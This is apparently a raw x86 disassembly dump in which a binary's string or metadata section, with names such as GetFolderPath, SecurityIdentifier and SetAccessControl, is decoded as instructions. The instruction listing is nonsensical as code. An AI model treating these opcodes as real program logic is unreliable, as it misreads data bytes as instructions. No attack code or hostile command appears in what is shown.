  40aa26:	je     0x40aa97
  40aa28:	jb     0x40aa2a
  40aa2a:	dec    ebp
  40aa2b:	outs   dx,DWORD PTR ds:[esi]
  40aa2c:	jbe    0x40aa93
  40aa2e:	dec    esi
  40aa2f:	gs js  0x40aaa6
  40aa32:	add    BYTE PTR [ecx+0x44],cl
  40aa35:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  40aa3c:	ins    BYTE PTR es:[edi],dx
  40aa3d:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  40aa42:	jo     0x40aab3
  40aa44:	jae    0x40aaab
  40aa46:	add    BYTE PTR [ecx+0x45],cl
  40aa49:	outs   dx,BYTE PTR ds:[esi]
  40aa4a:	jne    0x40aab9
  40aa4c:	gs jb  0x40aab0
  40aa4f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  40aa53:	xor    DWORD PTR [eax],eax
  40aa55:	addr16 gs je 0x40aab8
  40aa59:	inc    ecx
  40aa5a:	arpl   WORD PTR [ebx+0x65],sp
  40aa5d:	jae    0x40aad2
  40aa5f:	inc    ebx
  40aa60:	outs   dx,DWORD PTR ds:[esi]
  40aa61:	outs   dx,BYTE PTR ds:[esi]
  40aa62:	je     0x40aad6
  40aa64:	outs   dx,DWORD PTR ds:[esi]
  40aa65:	ins    BYTE PTR es:[edi],dx
  40aa66:	inc    ebp
  40aa67:	outs   dx,BYTE PTR ds:[esi]
  40aa68:	je     0x40aadc
  40aa6a:	imul   esp,DWORD PTR [ebp+0x73],0x74656700
  40aa71:	pop    edi
  40aa72:	dec    ecx
  40aa73:	outs   dx,BYTE PTR ds:[esi]
  40aa74:	jbe    0x40aad7
  40aa76:	jb     0x40aae1
  40aa78:	popa   
  40aa79:	outs   dx,BYTE PTR ds:[esi]
  40aa7a:	je     0x40aabf
  40aa7c:	jne    0x40aaea
  40aa7e:	je     0x40aaf5
  40aa80:	jb     0x40aae7
  40aa82:	add    BYTE PTR [edi+ebp*2+0x4c],dl
  40aa86:	outs   dx,DWORD PTR ds:[esi]
  40aa87:	ja     0x40aaee
  40aa89:	jb     0x40aa8b
  40aa8b:	inc    ebx
  40aa8c:	jb     0x40aaf3
  40aa8e:	popa   
  40aa8f:	je     0x40aaf6
  40aa91:	inc    esp
  40aa92:	gs jae 0x40aaf8
  40aa95:	jb     0x40ab00
  40aa97:	jo     0x40ab0d
  40aa99:	outs   dx,DWORD PTR ds:[esi]
  40aa9a:	jb     0x40aae2
  40aa9c:	jb     0x40ab0d
  40aa9e:	ins    DWORD PTR es:[edi],dx
  40aa9f:	push   ebx
  40aaa0:	imul   esp,DWORD PTR [eax+eax*1+0x49],0x746e6564
  40aaa8:	imul   esi,DWORD PTR [ecx+edi*2+0x53],0x63726165
  40aab0:	push   0x74636146
  40aab5:	outs   dx,DWORD PTR ds:[esi]
  40aab6:	jb     0x40aab8
  40aab8:	inc    edi
  40aab9:	jb     0x40ab2a
  40aabb:	jne    0x40ab2d
  40aabd:	push   edi
  40aabe:	gs ins BYTE PTR es:[edi],dx
  40aac0:	ins    BYTE PTR es:[edi],dx
  40aac1:	dec    ebx
  40aac2:	outs   dx,BYTE PTR ds:[esi]
  40aac3:	outs   dx,DWORD PTR ds:[esi]
  40aac4:	ja     0x40ab34
  40aac6:	inc    esp
  40aac7:	gs jae 0x40ab2d
  40aaca:	jb     0x40ab35
  40aacc:	jo     0x40ab42
  40aace:	outs   dx,DWORD PTR ds:[esi]
  40aacf:	jb     0x40ab44
  40aad1:	add    BYTE PTR [ebx+0x65],dl
  40aad4:	jb     0x40ab4c
  40aad6:	imul   esp,DWORD PTR [ebx+0x65],0x72657355
  40aadd:	jae    0x40ab26
  40aadf:	jb     0x40ab50
  40aae1:	jne    0x40ab53
  40aae3:	add    BYTE PTR [ebp+0x76],al
  40aae6:	gs jb  0x40ab62
  40aae9:	outs   dx,DWORD PTR ds:[esi]
  40aaea:	outs   dx,BYTE PTR ds:[esi]
  40aaeb:	gs inc edi
  40aaed:	jb     0x40ab5e
  40aaef:	jne    0x40ab61
  40aaf1:	add    BYTE PTR [esi+0x61],cl
  40aaf4:	ins    DWORD PTR es:[edi],dx
  40aaf5:	gs jae 0x40ab68
  40aaf8:	popa   
  40aaf9:	arpl   WORD PTR [ebp+0x41],sp
  40aafc:	fs ins DWORD PTR es:[edi],dx
  40aafe:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  40ab05:	je     0x40ab76
  40ab07:	jb     0x40ab7c
  40ab09:	inc    edi
  40ab0a:	jb     0x40ab7b
  40ab0c:	jne    0x40ab7e
  40ab0e:	add    BYTE PTR [ebp+0x78],al
  40ab11:	arpl   WORD PTR [ebp+0x70],sp
  40ab14:	je     0x40ab7f
  40ab16:	outs   dx,DWORD PTR ds:[esi]
  40ab17:	outs   dx,BYTE PTR ds:[esi]
  40ab18:	add    BYTE PTR [edi+0x65],ah
  40ab1b:	je     0x40ab7c
  40ab1d:	dec    ecx
  40ab1e:	jae    0x40ab61
  40ab20:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  40ab24:	add    BYTE PTR gs:[ebx+0x79],dl
  40ab28:	jae    0x40ab9e
  40ab2a:	gs ins DWORD PTR es:[edi],dx
  40ab2c:	cs push esp
  40ab2e:	push   0x64616572
  40ab33:	imul   ebp,DWORD PTR [esi+0x67],0x72685400
  40ab3a:	gs popa 
  40ab3c:	add    BYTE PTR fs:[ebx+0x6c],dl
  40ab40:	gs gs jo 0x40ab44
  40ab44:	push   ebx
  40ab45:	push   esp
  40ab46:	inc    ecx
  40ab47:	push   esp
  40ab48:	push   0x64616572
  40ab4d:	inc    ecx
  40ab4e:	je     0x40abc4
  40ab50:	jb     0x40abbb
  40ab52:	bound  esi,QWORD PTR [ebp+0x74]
  40ab55:	add    BYTE PTR gs:[edi+0x65],ah
  40ab59:	je     0x40abba
  40ab5b:	inc    ebx
  40ab5c:	jne    0x40abd0
  40ab5e:	jb     0x40abc5
  40ab60:	outs   dx,BYTE PTR ds:[esi]
  40ab61:	je     0x40abb7
  40ab63:	push   0x64616572
  40ab68:	add    BYTE PTR [edi+0x65],ah
  40ab6b:	je     0x40abcc
  40ab6d:	inc    ebx
  40ab6e:	jne    0x40abe2
  40ab70:	jb     0x40abd7
  40ab72:	outs   dx,BYTE PTR ds:[esi]
  40ab73:	je     0x40abca
  40ab75:	dec    ecx
  40ab76:	inc    ebx
  40ab77:	jne    0x40abe5
  40ab79:	je     0x40abf0
  40ab7b:	jb     0x40abe2
  40ab7d:	add    BYTE PTR [edi+0x65],al
  40ab80:	je     0x40abc5
  40ab82:	outs   dx,DWORD PTR ds:[esi]
  40ab83:	outs   dx,BYTE PTR ds:[esi]
  40ab84:	jae    0x40abf5
  40ab86:	ins    BYTE PTR es:[edi],dx
  40ab87:	gs inc esi
  40ab89:	popa   
  40ab8a:	ins    BYTE PTR es:[edi],dx
  40ab8b:	ins    BYTE PTR es:[edi],dx
  40ab8c:	bound  esp,QWORD PTR [ecx+0x63]
  40ab8f:	imul   edx,DWORD PTR [ebp+0x49],0x43
  40ab93:	jne    0x40ac01
  40ab95:	je     0x40ac0c
  40ab97:	jb     0x40abfe
  40ab99:	add    BYTE PTR [ebx+0x65],dh
  40ab9c:	je     0x40abfd
  40ab9e:	inc    ebx
  40ab9f:	jne    0x40ac13
  40aba1:	jb     0x40ac08
  40aba3:	outs   dx,BYTE PTR ds:[esi]
  40aba4:	je     0x40abfb
  40aba6:	dec    ecx
  40aba7:	inc    ebx
  40aba8:	jne    0x40ac16
  40abaa:	je     0x40ac21
  40abac:	jb     0x40ac13
  40abae:	add    BYTE PTR [ebx+0x79],dl
  40abb1:	jae    0x40ac27
  40abb3:	gs ins DWORD PTR es:[edi],dx
  40abb5:	cs push esp
  40abb7:	gs js  0x40ac2e
  40abba:	add    BYTE PTR [ebp+0x6e],al
  40abbd:	arpl   WORD PTR [edi+0x64],bp
  40abc0:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  40abc7:	pop    edi
  40abc8:	dec    edi
  40abc9:	jne    0x40ac3f
  40abcb:	jo     0x40ac42
  40abcd:	je     0x40ac14
  40abcf:	outs   dx,BYTE PTR ds:[esi]
  40abd0:	arpl   WORD PTR [edi+0x64],bp
  40abd3:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  40abda:	pop    edi
  40abdb:	inc    ebx
  40abdc:	outs   dx,DWORD PTR ds:[esi]
  40abdd:	fs gs push eax
  40abe0:	popa   
  40abe1:	add    BYTE PTR gs:[bx+0x65],ah
  40abe6:	je     0x40ac47
  40abe8:	push   ebp
  40abe9:	push   esp
  40abea:	inc    esi
  40abeb:	cmp    BYTE PTR [eax],al
  40abed:	push   esp
  40abee:	gs js  0x40ac65
  40abf1:	dec    ecx
  40abf2:	outs   dx,BYTE PTR ds:[esi]
  40abf3:	outs   dx,WORD PTR ds:[esi]
  40abf5:	add    BYTE PTR [edi+0x65],ah
  40abf8:	je     0x40ac59
  40abfa:	push   esp
  40abfb:	gs js  0x40ac72
  40abfe:	dec    ecx
  40abff:	outs   dx,BYTE PTR ds:[esi]
  40ac00:	outs   dx,WORD PTR ds:[esi]
  40ac02:	add    BYTE PTR [edi+0x65],ah
  40ac05:	je     0x40ac66
  40ac07:	dec    edi
  40ac08:	inc    ebp
  40ac09:	dec    ebp
  40ac0a:	inc    ebx
  40ac0b:	outs   dx,DWORD PTR ds:[esi]
  40ac0c:	fs gs push eax
  40ac0f:	popa   
  40ac10:	add    BYTE PTR gs:[bx+0x65],ah
  40ac15:	je     0x40ac76
  40ac17:	inc    ecx
  40ac18:	dec    esi
  40ac19:	push   ebx
  40ac1a:	dec    ecx
  40ac1b:	inc    ebx
  40ac1c:	outs   dx,DWORD PTR ds:[esi]
  40ac1d:	fs gs push eax
  40ac20:	popa   
  40ac21:	add    BYTE PTR gs:[si],bh
  40ac25:	push   eax
  40ac26:	jb     0x40ac91
  40ac28:	jbe    0x40ac8b
  40ac2a:	je     0x40ac91
  40ac2c:	dec    ecx
  40ac2d:	ins    DWORD PTR es:[edi],dx
  40ac2e:	jo     0x40ac9c
  40ac30:	gs ins DWORD PTR es:[edi],dx
  40ac32:	outs   dx,BYTE PTR gs:[esi]
  40ac34:	je     0x40ac97
  40ac36:	je     0x40aca1
  40ac38:	outs   dx,DWORD PTR ds:[esi]
  40ac39:	outs   dx,BYTE PTR ds:[esi]
  40ac3a:	inc    esp
  40ac3b:	gs je  0x40ac9f
  40ac3e:	imul   ebp,DWORD PTR [ebx+esi*2+0x3e],0x4337397b
  40ac46:	xor    bh,BYTE PTR [ecx]
  40ac48:	inc    ebp
  40ac49:	ss inc esi
  40ac4b:	sub    eax,0x46353132
  40ac50:	sub    eax,0x37313634
  40ac55:	sub    eax,0x32424542
  40ac5a:	sub    eax,0x42314544
  40ac5f:	xor    eax,0x38373431
  40ac64:	xor    esi,DWORD PTR [edx]
  40ac66:	inc    esp
  40ac67:	jge    0x40ac69
  40ac69:	inc    ebx
  40ac6a:	outs   dx,DWORD PTR ds:[esi]
  40ac6b:	ins    DWORD PTR es:[edi],dx
  40ac6c:	jo     0x40acd7
  40ac6e:	ins    BYTE PTR es:[edi],dx
  40ac6f:	gs jb  0x40acb9
  40ac72:	outs   dx,BYTE PTR gs:[esi]
  40ac74:	gs jb  0x40acd8
  40ac77:	je     0x40acde
  40ac79:	fs inc ecx
  40ac7b:	je     0x40acf1
  40ac7d:	jb     0x40ace8
  40ac7f:	bound  esi,QWORD PTR [ebp+0x74]
  40ac82:	add    BYTE PTR gs:[esi+0x61],dl
  40ac86:	ins    BYTE PTR es:[edi],dx
  40ac87:	jne    0x40acee
  40ac89:	push   esp
  40ac8a:	jns    0x40acfc
  40ac8c:	add    BYTE PTR gs:[edi+0x5f],bl
  40ac90:	push   ebx
  40ac91:	je     0x40acf4
  40ac93:	je     0x40acfe
  40ac95:	arpl   WORD PTR [ecx+0x72],ax
  40ac98:	jb     0x40acfb
  40ac9a:	jns    0x40ace5
  40ac9c:	outs   dx,BYTE PTR ds:[esi]
  40ac9d:	imul   esi,DWORD PTR [esp+edx*2+0x79],0x69536570
  40aca5:	jp     0x40ad0c
  40aca7:	cmp    eax,0x24003237
  40acac:	and    al,0x6d
  40acae:	gs je  0x40ad19
  40acb1:	outs   dx,DWORD PTR ds:[esi]
  40acb2:	xor    BYTE PTR fs:[eax+0x36],bh
  40acb6:	xor    BYTE PTR [eax],dh
  40acb8:	xor    BYTE PTR [eax],dh
  40acba:	xor    BYTE PTR [ecx+0x2d],ah
  40acbd:	xor    DWORD PTR [eax],eax
  40acbf:	push   edx
  40acc0:	jne    0x40ad30
  40acc2:	je     0x40ad2d
  40acc4:	ins    DWORD PTR es:[edi],dx
  40acc5:	gs dec eax
  40acc7:	gs ins BYTE PTR es:[edi],dx
  40acc9:	jo     0x40ad30
  40accb:	jb     0x40ad40
  40accd:	add    BYTE PTR [ecx+0x72],al
  40acd0:	jb     0x40ad33
  40acd2:	jns    0x40acd4
  40acd4:	push   edx
  40acd5:	jne    0x40ad45
  40acd7:	je     0x40ad42
  40acd9:	ins    DWORD PTR es:[edi],dx
  40acda:	gs inc esi
  40acdc:	imul   esp,DWORD PTR [ebp+0x6c],0x6e614864
  40ace3:	fs ins BYTE PTR es:[edi],dx
  40ace5:	add    BYTE PTR gs:[ecx+0x6e],cl
  40ace9:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40acf1:	inc    ecx
  40acf2:	jb     0x40ad66
  40acf4:	popa   
  40acf5:	jns    0x40acf7
  40acf7:	and    al,0x24
  40acf9:	ins    DWORD PTR es:[edi],dx
  40acfa:	gs je  0x40ad65
  40acfd:	outs   dx,DWORD PTR ds:[esi]
  40acfe:	xor    BYTE PTR fs:[eax+0x36],bh
  40ad02:	xor    BYTE PTR [eax],dh
  40ad04:	xor    BYTE PTR [eax],dh
  40ad06:	xor    BYTE PTR [ecx+0x2d],ah
  40ad09:	xor    al,BYTE PTR [eax]
  40ad0b:	inc    ebx
  40ad0c:	outs   dx,DWORD PTR ds:[esi]
  40ad0d:	outs   dx,BYTE PTR ds:[esi]
  40ad0e:	jae    0x40ad7f
  40ad10:	ins    BYTE PTR es:[edi],dx
  40ad11:	gs dec eax
  40ad13:	outs   dx,DWORD PTR ds:[esi]
  40ad14:	jae    0x40ad8a
  40ad16:	add    BYTE PTR [ecx+0x6e],cl
  40ad19:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40ad21:	add    BYTE PTR [ecx+0x72],al
  40ad24:	jb     0x40ad87
  40ad26:	jns    0x40ad74
  40ad28:	imul   esi,DWORD PTR [ebx+0x74],0x64644100
  40ad2f:	add    BYTE PTR [ebp+0x6e],al
  40ad32:	jbe    0x40ad9d
  40ad34:	jb     0x40ada5
  40ad36:	outs   dx,BYTE PTR ds:[esi]
  40ad37:	ins    DWORD PTR es:[edi],dx
  40ad38:	outs   dx,BYTE PTR gs:[esi]
  40ad3a:	je     0x40ad3c
  40ad3c:	inc    edi
  40ad3d:	gs je  0x40ad85
  40ad40:	outs   dx,BYTE PTR ds:[esi]
  40ad41:	jbe    0x40adac
  40ad43:	jb     0x40adb4
  40ad45:	outs   dx,BYTE PTR ds:[esi]
  40ad46:	ins    DWORD PTR es:[edi],dx
  40ad47:	outs   dx,BYTE PTR gs:[esi]
  40ad49:	je     0x40ada1
  40ad4b:	popa   
  40ad4c:	jb     0x40adb7
  40ad4e:	popa   
  40ad4f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  40ad53:	push   ebx
  40ad54:	jo     0x40adc2
  40ad56:	imul   esi,DWORD PTR [eax+eax*1+0x67],0x435f7465
  40ad5e:	push   0x737261
  40ad63:	push   ebx
  40ad64:	je     0x40adc7
  40ad66:	jb     0x40addc
  40ad68:	jae    0x40adc1
  40ad6a:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x70556f54
  40ad72:	jo     0x40add9
  40ad74:	jb     0x40ad76
  40ad76:	push   esp
  40ad77:	data16 jae 0x40adce
  40ad7a:	gs popa 
  40ad7c:	ins    DWORD PTR es:[edi],dx
  40ad7d:	push   eax
  40ad7e:	jb     0x40adef
  40ad80:	push   0x65
  40ad82:	arpl   WORD PTR [ebx+eax*2+0x6f],si
  40ad86:	ins    BYTE PTR es:[edi],dx
  40ad87:	ins    BYTE PTR es:[edi],dx
  40ad88:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40ad8d:	outs   dx,BYTE PTR ds:[esi]
  40ad8e:	add    BYTE PTR [ebp+0x72],dl
  40ad91:	imul   eax,DWORD PTR [eax],0x46746547
  40ad97:	jne    0x40ae05
  40ad99:	ins    BYTE PTR es:[edi],dx
  40ad9a:	jns    0x40aded
  40ad9c:	jne    0x40adff
  40ad9e:	ins    BYTE PTR es:[edi],dx
  40ad9f:	imul   esp,DWORD PTR [esi+0x69],0x72556465
  40ada6:	imul   eax,DWORD PTR [esi+0x6f],0x6d614e72
  40adad:	add    BYTE PTR gs:[esi+eiz*2+0x73],dl
  40adb2:	push   esp
  40adb3:	gs popa 
  40adb5:	ins    DWORD PTR es:[edi],dx
  40adb6:	push   eax
  40adb7:	jb     0x40ae28
  40adb9:	push   0x65
  40adbb:	arpl   WORD PTR [ebx+eax*2+0x6f],si
  40adbf:	ins    BYTE PTR es:[edi],dx
  40adc0:	ins    BYTE PTR es:[edi],dx
  40adc1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40adc6:	outs   dx,BYTE PTR ds:[esi]
  40adc7:	inc    esi
  40adc8:	popa   
  40adc9:	arpl   WORD PTR [edi+ebp*2+0x72],si
  40adcd:	jns    0x40adcf
  40adcf:	inc    edi
  40add0:	gs je  0x40ae27
  40add3:	gs popa 
  40add5:	ins    DWORD PTR es:[edi],dx
  40add6:	push   eax
  40add7:	jb     0x40ae48
  40add9:	push   0x65
  40addb:	arpl   WORD PTR [ebx+eax*2+0x6f],si
  40addf:	ins    BYTE PTR es:[edi],dx
  40ade0:	ins    BYTE PTR es:[edi],dx
  40ade1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40ade6:	outs   dx,BYTE PTR ds:[esi]
  40ade7:	add    BYTE PTR [esi+eiz*2+0x73],dl
  40adeb:	inc    ebx
  40adec:	outs   dx,DWORD PTR ds:[esi]
  40aded:	outs   dx,BYTE PTR ds:[esi]
  40adee:	imul   sp,WORD PTR [edi+0x75],0x6172
  40adf4:	je     0x40ae5f
  40adf6:	outs   dx,DWORD PTR ds:[esi]
  40adf7:	outs   dx,BYTE PTR ds:[esi]
  40adf8:	push   ebx
  40adf9:	gs jb  0x40ae72
  40adfc:	gs jb  0x40adff
  40adff:	push   esp
  40ae00:	data16 jae 0x40ae46
  40ae03:	outs   dx,DWORD PTR ds:[esi]
  40ae04:	outs   dx,BYTE PTR ds:[esi]
  40ae05:	imul   sp,WORD PTR [edi+0x75],0x6172
  40ae0b:	je     0x40ae76
  40ae0d:	outs   dx,DWORD PTR ds:[esi]
  40ae0e:	outs   dx,BYTE PTR ds:[esi]
  40ae0f:	push   ebx
  40ae10:	gs jb  0x40ae89
  40ae13:	gs jb  0x40ae5c
  40ae16:	popa   
  40ae17:	arpl   WORD PTR [edi+ebp*2+0x72],si
  40ae1b:	jns    0x40ae1d
  40ae1d:	inc    edi
  40ae1e:	gs je  0x40ae64
  40ae21:	outs   dx,DWORD PTR ds:[esi]
  40ae22:	outs   dx,BYTE PTR ds:[esi]
  40ae23:	imul   sp,WORD PTR [edi+0x75],0x6172
  40ae29:	je     0x40ae94
  40ae2b:	outs   dx,DWORD PTR ds:[esi]
  40ae2c:	outs   dx,BYTE PTR ds:[esi]
  40ae2d:	push   ebx
  40ae2e:	gs jb  0x40aea7
  40ae31:	gs jb  0x40ae34
  40ae34:	addr16 gs je 0x40ae97
  40ae38:	inc    ebx
  40ae39:	outs   dx,DWORD PTR ds:[esi]
  40ae3a:	jne    0x40aeaa
  40ae3c:	je     0x40ae3e
  40ae3e:	inc    ebx
  40ae3f:	outs   dx,DWORD PTR ds:[esi]
  40ae40:	jo     0x40aebb
  40ae42:	push   esp
  40ae43:	outs   dx,DWORD PTR ds:[esi]
  40ae44:	add    BYTE PTR [edi+0x65],ah
  40ae47:	je     0x40aea8
  40ae49:	push   ebp
  40ae4a:	jb     0x40aeb5
  40ae4c:	add    BYTE PTR [edi+0x65],ah
  40ae4f:	je     0x40aeb0
  40ae51:	dec    ebp
  40ae52:	gs jae 0x40aec8
  40ae55:	popa   
  40ae56:	add    BYTE PTR gs:[di+0x78],al
  40ae5b:	imul   esi,DWORD PTR [eax+eax*1+0x24],0x74656d24
  40ae63:	push   0x7830646f
  40ae68:	xor    BYTE PTR ss:[eax],dh
  40ae6b:	xor    BYTE PTR [eax],dh
  40ae6d:	xor    BYTE PTR [ecx+0x2d],ah
  40ae70:	xor    eax,DWORD PTR [eax]
  40ae72:	push   esp
  40ae73:	jb     0x40aeee
  40ae75:	inc    edi
  40ae76:	gs je  0x40aecf
  40ae79:	popa   
  40ae7a:	ins    BYTE PTR es:[edi],dx
  40ae7b:	jne    0x40aee2
  40ae7d:	add    BYTE PTR [ebx+0x72],al
  40ae80:	gs popa 
  40ae82:	je     0x40aee9
  40ae84:	inc    ecx
  40ae85:	jo     0x40aef7
  40ae87:	ins    BYTE PTR es:[edi],dx
  40ae88:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40ae8f:	inc    edi
  40ae90:	jb     0x40af01
  40ae92:	jne    0x40af04
  40ae94:	add    BYTE PTR [ecx+ebp*2+0x73],cl
  40ae98:	je     0x40aedb
  40ae9a:	jo     0x40af0c
  40ae9c:	ins    BYTE PTR es:[edi],dx
  40ae9d:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40aea4:	inc    edi
  40aea5:	jb     0x40af16
  40aea7:	jne    0x40af19
  40aea9:	jae    0x40aeab
  40aeab:	push   esp
  40aeac:	inc    esi
  40aead:	push   ebx
  40aeae:	je     0x40af22
  40aeb0:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  40aeb7:	popa   
  40aeb8:	jb     0x40af1f
  40aeba:	jb     0x40aebc
  40aebc:	addr16 gs je 0x40af1f
  40aec0:	inc    ebx
  40aec1:	outs   dx,DWORD PTR ds:[esi]
  40aec2:	ins    DWORD PTR es:[edi],dx
  40aec3:	ins    DWORD PTR es:[edi],dx
  40aec4:	popa   
  40aec5:	outs   dx,BYTE PTR ds:[esi]
  40aec6:	fs dec esp
  40aec8:	imul   ebp,DWORD PTR [esi+0x65],0x6974704f
  40aecf:	outs   dx,DWORD PTR ds:[esi]
  40aed0:	outs   dx,BYTE PTR ds:[esi]
  40aed1:	dec    esi
  40aed2:	popa   
  40aed3:	ins    DWORD PTR es:[edi],dx
  40aed4:	add    BYTE PTR gs:[edi+0x72],al
  40aed8:	outs   dx,DWORD PTR ds:[esi]
  40aed9:	jne    0x40af4b
  40aedb:	push   eax
  40aedc:	jb     0x40af4d
  40aede:	jo     0x40af45
  40aee0:	jb     0x40af56
  40aee2:	jns    0x40aee4
  40aee4:	push   ebp
  40aee5:	jo     0x40af4b
  40aee7:	popa   
  40aee8:	je     0x40af4f
  40aeea:	inc    ecx
  40aeeb:	jo     0x40af5d
  40aeed:	ins    BYTE PTR es:[edi],dx
  40aeee:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40aef5:	inc    edi
  40aef6:	jb     0x40af67
  40aef8:	jne    0x40af6a
  40aefa:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  40aefe:	gs je  0x40af66
  40af01:	inc    ecx
  40af02:	jo     0x40af74
  40af04:	ins    BYTE PTR es:[edi],dx
  40af05:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40af0c:	inc    edi
  40af0d:	jb     0x40af7e
  40af0f:	jne    0x40af81
  40af11:	add    BYTE PTR [ecx+0x64],al
  40af14:	fs dec ebp
  40af16:	gs ins DWORD PTR es:[edi],dx
  40af18:	bound  esp,QWORD PTR [ebp+0x72]
  40af1b:	push   esp
  40af1c:	outs   dx,DWORD PTR ds:[esi]
  40af1d:	inc    ecx
  40af1e:	jo     0x40af90
  40af20:	ins    BYTE PTR es:[edi],dx
  40af21:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40af28:	inc    edi
  40af29:	jb     0x40af9a
  40af2b:	jne    0x40af9d
  40af2d:	add    BYTE PTR [edx+0x65],dl
  40af30:	ins    DWORD PTR es:[edi],dx
  40af31:	outs   dx,DWORD PTR ds:[esi]
  40af32:	jbe    0x40af99
  40af34:	dec    ebp
  40af35:	gs ins DWORD PTR es:[edi],dx
  40af37:	bound  esp,QWORD PTR [ebp+0x72]
  40af3a:	inc    esi
  40af3b:	jb     0x40afac
  40af3d:	ins    DWORD PTR es:[edi],dx
  40af3e:	inc    ecx
  40af3f:	jo     0x40afb1
  40af41:	ins    BYTE PTR es:[edi],dx
  40af42:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40af49:	inc    edi
  40af4a:	jb     0x40afbb
  40af4c:	jne    0x40afbe
  40af4e:	add    BYTE PTR [edi+0x65],ah
  40af51:	je     0x40afb2
  40af53:	push   ebp
  40af54:	jae    0x40afbb
  40af56:	jb     0x40afa6
  40af58:	popa   
  40af59:	ins    DWORD PTR es:[edi],dx
  40af5a:	add    BYTE PTR gs:[ecx+0x73],cl
  40af5e:	dec    ebp
  40af5f:	gs ins DWORD PTR es:[edi],dx
  40af61:	bound  esp,QWORD PTR [ebp+0x72]
  40af64:	add    BYTE PTR [ebx+0x65],dl
  40af67:	je     0x40afb9
  40af69:	gs jb  0x40afd9
  40af6c:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  40af73:	add    BYTE PTR [ecx+0x75],dl
  40af76:	gs jb  0x40aff2
  40af79:	inc    ecx
  40af7a:	arpl   WORD PTR [ebx+0x65],sp
  40af7d:	jae    0x40aff2
  40af7f:	inc    ebx
  40af80:	outs   dx,DWORD PTR ds:[esi]
  40af81:	outs   dx,BYTE PTR ds:[esi]
  40af82:	je     0x40aff6
  40af84:	outs   dx,DWORD PTR ds:[esi]
  40af85:	ins    BYTE PTR es:[edi],dx
  40af86:	dec    esp
  40af87:	imul   esi,DWORD PTR [ebx+0x74],0x65755100
  40af8e:	jb     0x40b009
  40af90:	inc    ecx
  40af91:	arpl   WORD PTR [ebx+0x65],sp
  40af94:	jae    0x40b009
  40af96:	inc    ebx
  40af97:	outs   dx,DWORD PTR ds:[esi]
  40af98:	outs   dx,BYTE PTR ds:[esi]
  40af99:	je     0x40b00d
  40af9b:	outs   dx,DWORD PTR ds:[esi]
  40af9c:	ins    BYTE PTR es:[edi],dx
  40af9d:	inc    ebp
  40af9e:	outs   dx,BYTE PTR ds:[esi]
  40af9f:	je     0x40b013
  40afa1:	jns    0x40afa3
  40afa3:	push   edx
  40afa4:	gs ins DWORD PTR es:[edi],dx
  40afa6:	outs   dx,DWORD PTR ds:[esi]
  40afa7:	jbe    0x40b00e
  40afa9:	push   eax
  40afaa:	gs jb  0x40b01a
  40afad:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  40afb4:	add    BYTE PTR [ebx+0x65],dl
  40afb7:	je     0x40affa
  40afb9:	arpl   WORD PTR [ebx+0x65],sp
  40afbc:	jae    0x40b031
  40afbe:	inc    ebx
  40afbf:	outs   dx,DWORD PTR ds:[esi]
  40afc0:	outs   dx,BYTE PTR ds:[esi]
  40afc1:	je     0x40b035
  40afc3:	outs   dx,DWORD PTR ds:[esi]
  40afc4:	ins    BYTE PTR es:[edi],dx
  40afc5:	dec    esp
  40afc6:	imul   esi,DWORD PTR [ebx+0x74],0x79654b00
  40afcd:	inc    ebx
  40afce:	outs   dx,DWORD PTR ds:[esi]
  40afcf:	ins    BYTE PTR es:[edi],dx
  40afd0:	ins    BYTE PTR es:[edi],dx
  40afd1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40afd6:	outs   dx,BYTE PTR ds:[esi]
  40afd7:	add    BYTE PTR [edi+0x65],ah
  40afda:	je     0x40b03b
  40afdc:	dec    ebx
  40afdd:	gs jns 0x40b053
  40afe0:	add    BYTE PTR [ebp+0x6e],al
  40afe3:	jne    0x40b052
  40afe5:	gs jb  0x40b049
  40afe8:	je     0x40b059
  40afea:	jb     0x40afec
  40afec:	addr16 gs je 0x40b04f
  40aff0:	dec    ecx
  40aff1:	outs   dx,BYTE PTR ds:[esi]
  40aff2:	outs   dx,BYTE PTR ds:[esi]
  40aff3:	gs jb  0x40b03b
  40aff6:	js     0x40b05b
  40aff8:	gs jo  0x40b06f
  40affb:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  40b002:	inc    edx
  40b003:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6f466b73
  40b00b:	jb     0x40b04e
  40b00d:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40b011:	outs   dx,BYTE PTR ds:[esi]
  40b012:	add    BYTE PTR [edx+0x65],dl
  40b015:	popa   
  40b016:	fs inc ecx
  40b018:	arpl   WORD PTR [ebx+0x65],sp
  40b01b:	jae    0x40b090
  40b01d:	inc    ebx
  40b01e:	outs   dx,DWORD PTR ds:[esi]
  40b01f:	outs   dx,BYTE PTR ds:[esi]
  40b020:	je     0x40b094
  40b022:	outs   dx,DWORD PTR ds:[esi]
  40b023:	ins    BYTE PTR es:[edi],dx
  40b024:	dec    esp
  40b025:	imul   esi,DWORD PTR [ebx+0x74],0x6d655200
  40b02c:	outs   dx,DWORD PTR ds:[esi]
  40b02d:	jbe    0x40b094
  40b02f:	inc    ecx
  40b030:	arpl   WORD PTR [ebx+0x65],sp
  40b033:	jae    0x40b0a8
